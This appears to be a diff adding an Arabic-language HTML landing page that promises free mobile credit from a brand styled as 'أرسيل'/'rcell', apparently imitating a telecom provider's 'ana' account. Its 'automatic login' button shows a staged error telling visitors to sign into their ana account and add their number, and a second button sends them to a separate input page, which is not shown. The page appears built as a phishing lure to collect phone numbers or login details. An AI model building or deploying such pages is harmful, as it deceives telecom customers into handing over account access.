@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>اربح بطاقتك من أرسيل</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Arial', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 500px;
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      text-align: right;
+    }
+
+    .logo-small {
+      width: 50px;
+      height: 50px;
+      margin-bottom: 10px;
+    }
+
+    .main-image {
+      width: 100%;
+      height: auto;
+      max-height: 300px;
+      margin-bottom: 20px;
+      border-radius: 8px;
+    }
+
+    .title {
+      font-size: 18px;
+      margin-bottom: 15px;
+      color: #333;
+      text-align: right;
+      font-weight: bold;
+    }
+
+    .main-button {
+      background-color: #ccc; /* لون رمادي */
+      color: #000;
+      border: none;
+      padding: 15px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    .log-button{
+      width: 100%;
+      background-color: #eb8f26;
+      color: #fff;
+      font-weight: bold;
+      margin-bottom: 10px;
+      padding: 15px;
+      border-radius: 10px;
+      border:none;
+      cursor: pointer;
+      font-size: 16px;
+
+    }
+
+    .note {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 20px;
+      line-height: 1.6;
+    }
+
+    .lang-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+
+    .lang-buttons button {
+      padding: 8px 12px;
+      font-size: 12px;
+      border: 1px solid #aaa;
+      background-color: white;
+      color: #333;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .lang-buttons button:hover {
+      background-color: #eee;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+    }
+
+    @media screen and (max-width: 480px) {
+      .container {
+        padding: 20px;
+      }
+
+      .main-button {
+        font-size: 14px;
+        padding: 12px;
+      }
+    }
+
+    #par{
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="logo_colorful.jpg" alt="شعار" class="logo-small">
+    <img src="login.jpg" alt="تسجيل الدخول" class="main-image">
+
+    <!-- العنوان -->
+    <div class="title">سجّل دخولك واربح رصيد مجاني من أرسيل!</div>
+
+    <!-- الزر الرمادي -->
+    <button class="log-button" onclick=" defolt()"> تسجيل الدخول تلقائي </button>
+    <p id="par"></p>
+    <button class="main-button" onclick="Alert()">تسجيل الدخول في حساب أنا</button>
+    
+
+    <!-- الملاحظة -->
+    <div class="note">
+      *لاستخدام الرعاية الذاتية ، يجب عليك أولاً إنشاء حساب ana.
+    </div>
+
+    <!-- أزرار تغيير اللغة -->
+    <div class="lang-buttons">
+      <button style="background-color: #eb8f26; color: white;">AR</button>
+       <button>KU</button>
+      <button>EN</button>
+     
+    </div>
+
+    <!-- الحقوق -->
+    <div class="footer">
+      © 2018-2024 rcell. كل الحقوق محفوظة
+    </div>
+  </div>
+
+
+  <SCript>
+
+    function Alert(){
+
+        location.href = "input.html"
+  
+    }
+
+        
+        var par = document.getElementById("par")
+    function defolt(){
+
+     
+        alert(" قم بتسجيل في  حساب انا و قم بي  اضافة رقمك  ");
+        par.style.display = "block"
+        par.innerHTML =  " حدث خطا يجب ان تقوم بالدخول في  حساب انا "
+        par.style.color = "red"
+        par.style.fontSize = "15px"
+    }
+    
+
+    
+
+  </SCript>
+
+</body>
+</html>
